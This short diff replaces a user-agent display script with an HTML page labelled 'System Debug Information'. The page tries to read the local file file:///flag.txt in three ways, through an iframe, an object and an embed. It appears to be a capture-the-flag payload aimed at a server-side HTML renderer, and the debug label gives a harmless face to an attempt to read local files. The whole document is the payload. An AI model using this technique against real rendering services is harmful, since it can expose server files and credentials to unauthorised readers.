@@ -1,4 +1,16 @@
-<script>
-    document.write("User Agent: " + navigator.userAgent);
-    document.write("<br>Location: " + window.location.href);
-</script>
+<!DOCTYPE html>
+<html>
+<body style="background: white; color: black; padding: 20px;">
+    <h1>System Debug Information</h1>
+    <hr>
+    <h3>Local File Access Test:</h3>
+    <p>Attempt 1 (Iframe):</p>
+    <iframe src="file:///flag.txt" width="100%" height="100px" style="border: 1px solid red;"></iframe>
+
+    <p>Attempt 2 (Object):</p>
+    <object data="file:///flag.txt" type="text/plain" width="100%" height="100px" style="border: 1px solid blue;"></object>
+
+    <p>Attempt 3 (Embed):</p>
+    <embed src="file:///flag.txt" width="100%" height="100px">
+</body>
+</html>
